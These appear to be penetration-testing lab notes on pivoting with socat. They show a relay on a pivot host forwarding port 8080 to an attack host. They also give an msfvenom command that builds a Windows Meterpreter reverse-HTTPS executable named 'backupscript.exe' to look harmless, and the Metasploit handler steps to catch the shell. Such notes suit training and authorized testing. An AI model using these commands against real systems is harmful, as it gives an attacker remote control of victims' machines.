
Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling.

**Starting Socat Listener (on pivot host)
```shell-session
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- socat listens on localhost port 8080 and forward all the traffic to port 80 on our attack host

**Creating the Windows Payload
```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
- Transfer payload to the Windows host


**Configuring & Starting the multi/handler
```shell-session
use exploit/multi/handler
```
```shell-session
set payload windows/x64/meterpreter/reverse_https
```
```shell-session
set lhost 0.0.0.0
```
```shell-session
set lport 80
```
```shell-session
run
```
```shell-session
getuid
```
